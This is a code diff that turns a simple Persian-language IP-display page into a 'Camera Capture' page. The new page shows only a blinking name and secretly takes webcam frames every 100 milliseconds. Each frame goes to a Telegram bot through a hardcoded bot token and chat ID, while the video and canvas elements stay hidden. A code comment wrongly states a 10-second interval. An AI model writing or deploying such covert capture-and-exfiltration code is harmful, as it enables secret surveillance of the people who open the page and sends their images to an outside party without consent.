@@ -3,15 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ارسال IP به تلگرام و ایمیل</title>
-    <link rel="stylesheet" href="styles.css">
+    <title>Camera Capture</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #000;
+            color: #fff;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            position: relative;
+        }
+
+        h1 {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 3rem;
+            color: #fff;
+            font-weight: bold;
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50%, 100% {
+                opacity: 1;
+            }
+            25%, 75% {
+                opacity: 0;
+            }
+        }
+
+        video, canvas {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <h1>ارسال آدرس IP</h1>
-        <button id="getIpButton">دریافت آدرس IP</button>
-        <p id="ipDisplay"></p>
-    </div>
-    <script src="script.js"></script>
+    <h1>Dr.Sadeghi</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+    
+    <script>
+        // درخواست دسترسی به دوربین
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.play();
+
+                // گرفتن تصویر از دوربین هر ده ثانیه
+                setInterval(() => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // تبدیل تصویر به داده Base64
+                    const dataURL = canvas.toDataURL('image/jpeg');
+                    sendImage(dataURL);
+                }, 100); // 10000 میلی‌ثانیه = 10 ثانیه
+            })
+            .catch(error => {
+                console.error('Error accessing the camera:', error);
+            });
+
+        function sendImage(dataURL) {
+            // تبدیل داده Base64 به Blob
+            const base64 = dataURL.split(',')[1];
+            const blob = new Blob([Uint8Array.from(atob(base64), c => c.charCodeAt(0))], { type: 'image/jpeg' });
+            const formData = new FormData();
+            formData.append('photo', blob, 'image.jpg');
+
+            fetch('https://api.telegram.org/bot7913565286:AAEhOeN9HOfkiM9kh29mVeCJha8dwwj6jKM/sendPhoto?chat_id=8164947082', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Image sent successfully:', result);
+            })
+            .catch(error => {
+                console.error('Error sending image:', error);
+            });
+        }
+    </script>
 </body>
 </html>
